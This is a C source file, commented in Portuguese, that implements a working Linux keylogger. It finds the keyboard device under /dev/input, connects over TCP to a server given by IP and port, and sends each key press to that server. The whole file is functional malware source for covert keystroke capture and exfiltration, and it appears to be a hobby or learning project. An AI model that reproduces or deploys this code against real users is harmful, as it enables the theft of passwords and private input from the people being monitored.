#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <dirent.h>
#include <linux/input.h>

#include "protocol.h"

// essa macro faz uma operação bitwise e retorna 1 se a tecla que passamos (bit) está dentro
// do nosso array (key_bitmask)
#define TEST_BIT(bit, array) (array[(bit) / 8] & (1 << ((bit) % 8))) 

int open_server_connection(const char *ip, short port){
    int client_socketFd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    must_init("socket() failed - error creating socket fd\n", client_socketFd);

    struct sockaddr_in server_sockAddr;

    memset(&server_sockAddr, 0, sizeof(server_sockAddr));

    server_sockAddr.sin_family = AF_INET;
    server_sockAddr.sin_port = htons(port);

    int ip_status = inet_pton(AF_INET, ip, &server_sockAddr.sin_addr);
    if (ip_status == 0) {
        printf("Erro: O IP '%s' tem um formato invalido.\n", ip);
        return -1;
    } else if (ip_status < 0) {
        perror("Erro fatal na familia de rede");
        return -1;
    }

    printf("trying to connect to server\n");

    must_init("connection to server failed\n", connect(client_socketFd, (struct sockaddr *)&server_sockAddr, sizeof(server_sockAddr)));

    printf("connected to server\n");
    
    return client_socketFd;
}

int find_keyboard_event(){
    struct dirent *dir_entry;
    DIR *dir = opendir("/dev/input");
    if(dir == NULL){
        perror("Erro ao abrir /dev/input\n");
        return -1;
    }

    // cria um array grande o suficiente para armazenar todas as teclas que o linux conhece
    // a cada fd que ele abrir, as teclas reconhecidas serão marcadas com 1
    // KEY_MAX é definida em <linux/input.h> e é + - uns 760 valores
    unsigned char key_bitmask[KEY_MAX / 8 + 1];

    // readdir() retorna um ponteiro para uma struct representando a entrada do diretório
    // na posição atual da stream especificada pelo argumento
    while((dir_entry = readdir(dir)) != NULL){
        if(strncmp(dir_entry->d_name, "event", 5) != 0) continue;

        char fullpath[512];
        snprintf(fullpath, sizeof(fullpath), "/dev/input/%s", dir_entry->d_name);

        int fd = open(fullpath, O_RDONLY);
        if(fd < 0) continue;

        memset(key_bitmask, 0, sizeof(key_bitmask));

        if(ioctl(fd, EVIOCGBIT(EV_KEY, KEY_MAX), key_bitmask) >= 0){
            if(TEST_BIT(KEY_A, key_bitmask)){
                // teclado localizado com sucesso :D
                // então retornamos o fd desse teclado
                closedir(dir);
                return fd;
            }
        }
        close(fd);
    }
    closedir(dir);
    return -1;
}

void start_keylogger(int serverfd, int keyboard){
    struct input_event events[MAX_EVENTS];
    KeyPackage packet;

    while(true){
        ssize_t read_bytes = read(keyboard, events, sizeof(struct input_event) * MAX_EVENTS);
        
        if(read_bytes < 0){
            perror("read() error");
            goto cleanup;
        }

        size_t num_events = read_bytes / sizeof(struct input_event);

        for(size_t i = 0; i < num_events; i++){
            if(events[i].type == EV_KEY && events[i].value == KEY_PRESSED){
                packet.key_code = events[i].code;
                packet.is_pressed = KEY_PRESSED;

                ssize_t sent = send(serverfd, &packet, sizeof(KeyPackage), MSG_NOSIGNAL);

                if(sent < 0){
                    perror("server connection lost");
                    goto cleanup;
                }
            }
        }
    }
    cleanup:
        printf("Closing keylogger..\n");
        close(keyboard);
        close(serverfd);
}